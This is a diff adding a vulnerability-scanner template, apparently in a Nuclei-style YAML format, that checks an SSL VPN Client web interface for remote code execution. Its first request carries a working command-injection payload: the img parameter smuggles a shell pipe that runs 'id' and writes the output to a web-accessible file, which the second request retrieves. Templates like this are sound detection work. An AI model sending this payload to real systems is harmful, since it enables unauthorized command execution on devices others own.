@@ -1,0 +1,30 @@
+id: sslvpn-client-rce
+brief:
+    title: SSL VPN Client - Remote Code Execution
+    by: DhiyaneshDK
+    level: critical
+    about: SSL VPN Client is vulnerable to RCE.
+    label:
+        - sslvpn
+        - rce
+        - intrusive
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/sslvpn/sslvpn_client.php?client=logoImg&img=%20/tmp|echo%20%60id%60%20|tee%20/usr/local/webui/sslvpn/{{filename}}.txt'
+      signs:
+        - "on": word
+          has:
+            - text/plain
+          in: header_2
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/sslvpn/{{filename}}.txt'
+      signs:
+        - "on": word
+          has:
+            - text/plain
+          in: header_2
+          need: all
